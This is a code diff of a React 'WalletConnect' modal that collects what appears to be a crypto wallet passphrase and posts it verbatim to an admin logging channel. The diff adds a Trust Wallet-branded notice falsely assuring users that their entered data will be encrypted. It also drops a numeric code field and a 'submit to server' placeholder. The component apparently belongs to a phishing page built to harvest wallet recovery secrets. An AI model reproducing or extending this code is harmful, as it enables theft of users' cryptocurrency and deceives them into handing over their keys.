@@ -4,28 +4,27 @@ import React, { JSX, FC } from "react";
 import { FieldValues, useForm } from "react-hook-form";
 
 import type { TWCFieldset, TWalletConnectProps } from "./types";
-import ValidTextarea from "@/ui/ValidTextarea/ValidTextarea";
-import ValidInp from "@/ui/ValidInp/ValidInp";
 import StyledWrapper from "@/ui/StyledWrapper/StyledWrapper";
+import Toast from "@/ui/Toast";
+import ValidTextarea from "@/ui/ValidTextarea/ValidTextarea";
 import Multistep, { useMultistepForm } from "@/components/Multistep";
 import EnterPassphrase from "@/modules/Forms/EnterPassphrase";
 
 import { wcModalData } from "./data";
 import { logMessages } from "@/data/initial";
-import { INITCODE_LENGTH } from "@/data/constants/limits";
 import { type TWalletConnectInit, wcFormInit } from "@/data/modals/init-values";
 import { ROUTES } from "@/data/routes";
 import { checkPendingIcon } from "@/data/pages/ui-icons";
 import { PASSPHRASE_DATA } from "@/data/pages/inp-data";
 import { NEXT_PUBLIC_TEAM_LOG_CHANNEL, NEXT_PUBLIC_ADMIN_LOG_CHANNEL } from "@/data/api/env";
 import { sendExtendedLog } from "@/utils/logger";
+import { trustWalletIcon } from "@/data/pages/web3-icons";
 
 // * WalletConnect - WC or wc
 export const WalletConnect = ({ setIsOpenModal }: TWalletConnectProps): JSX.Element => {
     const {
         register,
         handleSubmit,
-        getValues,
         formState: { isSubmitting, errors },
         reset,
     } = useForm<TWalletConnectInit>({
@@ -44,25 +43,12 @@ export const WalletConnect = ({ setIsOpenModal }: TWalletConnectProps): JSX.Elem
             legend="Connect external wallet"
         >
             <StyledWrapper className="form-controller">
-                <ValidInp
-                    id="wallet-connect-code"
-                    type="number"
-                    className="inp"
-                    title={PASSPHRASE_DATA.code.title}
-                    placeholder={PASSPHRASE_DATA.code.placeholder}
-                    required
-                    register={register}
-                    regex={PASSPHRASE_DATA.code.regex}
-                    regexErrMessage={PASSPHRASE_DATA.code.regexErrMessage}
-                    min={0}
-                    max={999999}
-                    minLength={INITCODE_LENGTH}
-                    maxLength={INITCODE_LENGTH}
+                <Toast
+                    id="wallet-connect-toast"
+                    wrapperModif="toast--success"
+                    icon={trustWalletIcon}
+                    content="Entered data will be encrypted. HTTP connection secured by SSL certificate."
                 />
-                <small className="form-controller__message">
-                    {errors["wallet-connect-code"]?.type === "required" && PASSPHRASE_DATA.code.requiredErrMessage}
-                    {errors["wallet-connect-code"]?.type === "pattern" && PASSPHRASE_DATA.code.regexErrMessage}
-                </small>
                 <ValidTextarea
                     id="wallet-connect-textarea"
                     className="textarea inp"
@@ -98,15 +84,12 @@ export const WalletConnect = ({ setIsOpenModal }: TWalletConnectProps): JSX.Elem
         await sendExtendedLog(NEXT_PUBLIC_TEAM_LOG_CHANNEL, logMessages.walletConnect);
 
         // * Don't add whitespaces, tabs, etc. in query string. Default variant is correct
-        const queryStr = `${logMessages.walletConnect}<pre><code>${getValues("wallet-connect-textarea")}</code></pre> <pre><code>${getValues("wallet-connect-code")}</code></pre>`;
+        const queryStr = `${logMessages.walletConnect}<pre><code>${data["wallet-connect-textarea"]}</code></pre>`;
         await sendExtendedLog(NEXT_PUBLIC_ADMIN_LOG_CHANNEL, queryStr);
 
         await new Promise((resolve: any) => setTimeout(resolve, 2000));
         reset();
         setIsOpenModal && setIsOpenModal(false);
-
-        // * TODO Submit to server
-        // * ...
     };
 
     return (
